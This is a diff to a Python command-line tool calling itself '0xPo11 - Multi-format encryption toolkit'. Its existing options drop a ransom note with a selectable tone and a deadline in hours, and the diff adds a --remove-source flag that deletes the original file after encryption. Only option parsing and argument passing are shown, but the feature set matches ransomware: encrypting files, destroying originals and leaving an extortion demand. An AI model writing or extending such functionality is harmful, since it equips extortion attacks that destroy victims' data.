@@ -78,6 +78,7 @@ def _build_args(
     deadline: str | None = None,
     drop_note: str | None = None,
     note_out: str | None = None,
+    remove_source: bool = False,
 ) -> _Args:
     """Build an args namespace for cipher functions."""
     return _Args(
@@ -109,6 +110,7 @@ def _build_args(
         deadline=deadline,
         drop_note=drop_note,
         note_out=note_out,
+        remove_source=remove_source,
     )
 
 
@@ -521,6 +523,7 @@ def _run_console() -> None:
 )
 @click.option("--drop-note", "drop_note", help="After encrypting, drop ransom note (template: generic/polite/press)")
 @click.option("--note-out", "note_out", help="Where to write the dropped ransom note (default: source parent / NOTE.txt)")
+@click.option("--remove-source", "remove_source", is_flag=True, help="After a successful encryption, delete the original file (encrypt only)")
 @click.option("-tm", "--template", "template", help="Ransom note voice (rn)")
 @click.option("-dl", "--deadline", "deadline", help="Ransom note deadline in hours (rn)")
 @click.option("-ii", "--inputImage", "input_image", help="Input image path")
@@ -567,6 +570,7 @@ def main(
     deadline: str | None,
     drop_note: str | None,
     note_out: str | None,
+    remove_source: bool,
 ) -> None:
     """0xPo11 - Multi-format encryption toolkit."""
     global _last_result
@@ -687,6 +691,7 @@ def main(
         deadline=deadline,
         drop_note=drop_note,
         note_out=note_out,
+        remove_source=remove_source,
     )
 
     _last_result = _dispatch(cipher_obj, args, mode or mode_mode, payload, generate)
